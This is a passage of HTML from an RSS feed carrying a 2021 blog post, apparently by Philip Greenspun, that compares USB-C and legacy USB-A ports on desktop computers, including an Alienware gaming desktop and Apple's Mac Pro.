https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-36-1536x649.png 1536w, https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-36.png 1584w" sizes="(max-width: 488px) 100vw, 488px"></a></figure></div> <p>The machine has a single USB-C port and eleven legacy USB-A ports.</p> <div><figure><a href="https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-37.png"><img decoding="async" src="https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-37-1520x1129.png" alt="" width="465" height="345" srcset="https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-37-1520x1129.png 1520w, https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-37-1024x760.png 1024w, https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-37-300x223.png 300w, https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-37-768x570.png 768w, https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-37-1536x1140.png 1536w, https://philip.greenspun.com/blog/wp-content/uploads/2021/03/image-37.png 1658w" sizes="(max-width: 465px) 100vw, 465px"></a></figure></div> <p>What if you want to spend $5,000 on <a href="https://www.dell.com/en-us/member/shop/desktop-computers/alienware-aurora-r12-gaming-desktop/spd/alienware-aurora-r12-desktop/wdaurr1260h">an Alienware gaming desktop from Dell</a>? You get… a 2 TB mechanical hard drive (also an SSD), a healthy 128 GB of RAM, and two USB-C ports (plus a bunch of USB-A ports).</p> <p>Apple fanboys/fangirls/fanothers: even the Mac Pro includes two legacy USB-A ports (admittedly it also has four <a href="https://www.pcmag.com/news/thunderbolt-3-vs-usb-c-whats-the-difference">Thunderbolt</a> ports). Why is this relic of old tech cluttering the clean design of an Apple product in 2021?</p> <p>Related:</p> <ul><li><a href="https://en.wikipedia.org/wiki/USB4">USB4</a> was standardized in 2019, but PC motherboards still don’t support it at all? (and therefore nobody should build a new PC right now because the USB4 motherboards are around the corner?)</li></ul>  </div>  </article>  </main> </div></div>]]></description>
        </item>
    </channel>
</rss>